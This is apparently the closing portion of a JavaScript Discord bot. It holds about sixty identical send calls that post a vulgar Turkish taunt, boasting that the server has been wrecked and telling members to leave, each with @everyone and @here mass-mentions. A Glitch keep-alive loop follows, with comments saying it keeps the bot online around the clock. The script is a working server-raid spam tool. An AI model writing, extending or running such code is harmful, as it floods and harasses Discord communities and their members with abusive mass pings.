    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
    msg.channel.send('`Bu Sunucunun Amına Koyduk Hadi Şimdi SG!` @everyone @here :wink:');
  }
});


const http = require("http");
const express = require("express");
const app = express();
    function sleep(milliseconds) {
  var start = new Date().getTime();
  for (var i = 0; i < 1e7; i++) { 
    if ((new Date().getTime() - start) > milliseconds){         //// 7-24 AÇIK KALMASINI SAĞLAYAN KOMUT BİRŞEY DEĞİŞTİRMEYİN
      break;
    }
  }    
}
app.get("/", (request, response) => {
  console.log(Date.now() + " Ping tamamdır."); 
  response.sendStatus(200);
});
app.listen(process.env.PORT);
setInterval(() => {
  http.get(`http://${process.env.PROJECT_DOMAIN}.glitch.me/`);   //// 7-24 AÇIK KALMASINI SAĞLAYAN KOMUT BİRŞEY DEĞİŞTİRMEYİN
}, 3000);

